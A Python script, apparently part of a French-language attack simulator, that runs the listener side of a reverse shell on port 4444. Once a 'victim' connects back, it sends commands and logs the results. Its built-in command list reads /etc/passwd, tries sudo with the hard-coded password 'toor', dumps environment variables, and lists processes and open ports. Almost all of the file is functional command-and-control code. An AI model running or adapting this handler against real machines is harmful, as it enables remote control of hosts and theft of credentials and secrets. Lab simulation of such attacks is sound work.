#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Apr 27 2026
@author: hounsousamuel
"""

import socket
import json
import time
import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", "..", "..", ".."))))
from simulateur_utils.logger import get_logger
logger = get_logger()

DEFAULT_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "hostname -I",
    "cat /etc/passwd",
    {"cmd": "sudo -S whoami", "input": "toor\n"},
    "echo 'toor' | sudo -S whoami",
    "env",
    "netstat -tuln",
    "ps aux",
    "cat /log/victime.txt",
    "echo 'SAM le HACKER'"
]

class AttaquantResult:
    """Stocke les résultats de l'attaquant."""
    def __init__(self):
        self.attaquant_result: list[dict] = []
        self.start_time: float = None
        self.end_time: float = None
        self.ip: str = None
        self.port: int = None

    def add(self, result: dict):
        self.attaquant_result.append(result)

    def success_commands(self):
        return [r for r in self.attaquant_result if r.get("returncode") == 0]

    def failed_commands(self):
        return [r for r in self.attaquant_result if r.get("returncode") != 0]

    def elapsed(self):
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return None
    
    def to_dict(self) -> dict:
        """Convertit l'objet en dictionnaire pour la sérialisation JSON."""
        return {
            "ip": self.ip,
            "port": self.port,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "elapsed": self.elapsed(),
            "total_commands": len(self.attaquant_result),
            "success_count": len(self.success_commands()),
            "failed_count": len(self.failed_commands()),
            "success_rate": len(self.success_commands()) / len(self.attaquant_result) if self.attaquant_result else 0.0,
            "results": self.attaquant_result,
            "success_commands": self.success_commands(),
            "failed_commands": self.failed_commands(),
        }
    
    def __repr__(self):
        return (
            f"AttaquantResult("
            f"total={len(self.attaquant_result)}, "
            f"success={len(self.success_commands())}, "
            f"failed={len(self.failed_commands())}, "
            f"elapsed={self.elapsed():.2f}s)"
        )

    def __str__(self):
        return (
            f"AttaquantResult("
            f"total={len(self.attaquant_result)}, "
            f"success={len(self.success_commands())}, "
            f"failed={len(self.failed_commands())}, "
            f"elapsed={self.elapsed():.2f}s)"
        )


def attaquant(
    ip: str,
    port: int,
    commands: list[str | dict],
    result_obj: AttaquantResult,
    timeout: float = 10.0,
    delay: float = 0.2,
):
    """
    Attaquant adapté à la victime.

    Parameters
    ----------
    ip          : IP du listener (attaquant)
    port        : Port du listener
    commands    : Liste de commandes à exécuter
                  - str  → {"cmd": "whoami"}
                  - dict → {"cmd": "sudo -S id", "input": "password\n"}
    result_obj  : Instance AttaquantResult — résultats stockés dans .attaquant_result
    timeout     : Timeout socket en secondes
    delay       : Délai entre chaque commande
    """
    result_obj.ip = ip
    result_obj.port = port
    result_obj.start_time = time.time()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    server.settimeout(timeout)
    server.bind(("0.0.0.0", port))
    server.listen(1)

    logger.print(f"[*] Listener démarré sur 0.0.0.0:{port} — en attente de la victime...")

    try:
        conn, addr = server.accept()
        conn.settimeout(timeout)
        logger.print(f"[+] Victime connectée depuis {addr} 😈")

        for cmd in commands:
            # logger.print(cmd)
            # Normaliser en dict
            if isinstance(cmd, str):
                payload = {"cmd": cmd}
            elif isinstance(cmd, dict):
                payload = cmd
            else:
                continue

            try:
                # Envoyer la commande
                # logger.print("Envoie cmd")
                conn.send(json.dumps(payload).encode())
                # logger.print("Cmd envoyé, debut sleep")
                time.sleep(delay)
                # logger.print("Fin sleep")

                # Recevoir le résultat
                # logger.print("Début recv")
                raw = conn.recv(65536)
                # logger.print("Recv fini, obtenu", raw)
                if not raw:
                    logger.print(f"[-] Connexion perdue après '{payload['cmd']}'")
                    break

                result = json.loads(raw.decode())
                result_obj.add(result)

                logger.print(f"[>] CMD      : {result.get('cmd')}")
                logger.print(f"    STDOUT   : {result.get('stdout', '').strip()[:200]}")
                logger.print(f"    STDERR   : {result.get('stderr', '').strip()[:100]}")
                logger.print(f"    RETCODE  : {result.get('returncode')}")
                logger.print()

            except socket.timeout:
                logger.print(f"[-] Timeout sur la commande : {payload['cmd']}")
                result_obj.add({
                    "cmd": payload.get("cmd"),
                    "stdout": "",
                    "stderr": "timeout",
                    "returncode": -1,
                })
            except json.JSONDecodeError as e:
                logger.print(f"[-] JSON invalide : {e}")
            except Exception as e:
                logger.print(f"[-] Erreur : {e}")
                break

    except socket.timeout:
        logger.print("[-] Timeout — victime pas connectée dans le délai imparti")
    except Exception as e:
        logger.print(f"[-] Erreur listener : {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass
        server.close()
        result_obj.end_time = time.time()
        logger.print(f"\n[*] Session terminée — {result_obj}")


def print_result(results, logger = logger):
    if not logger:
        print("\n=== RÉSULTATS ===")
        print(f"Total     : {len(results.attaquant_result)}")
        print(f"Succès    : {len(results.success_commands())}")
        print(f"Échecs    : {len(results.failed_commands())}")
        print(f"Elapsed   : {results.elapsed():.2f}s")
    else:
        logger.print("\n=== RÉSULTATS ===")
        logger.print(f"Total     : {len(results.attaquant_result)}")
        logger.print(f"Succès    : {len(results.success_commands())}")
        logger.print(f"Échecs    : {len(results.failed_commands())}")
        logger.print(f"Elapsed   : {results.elapsed():.2f}s")
        
if __name__ == "__main__":
    # Test local
    results = AttaquantResult()

    attaquant(
        ip="0.0.0.0",
        port=4444,
        commands=DEFAULT_COMMANDS,
        result_obj=results,
        timeout=10.0,
        delay=0.3,
    )
    print_result(results)

    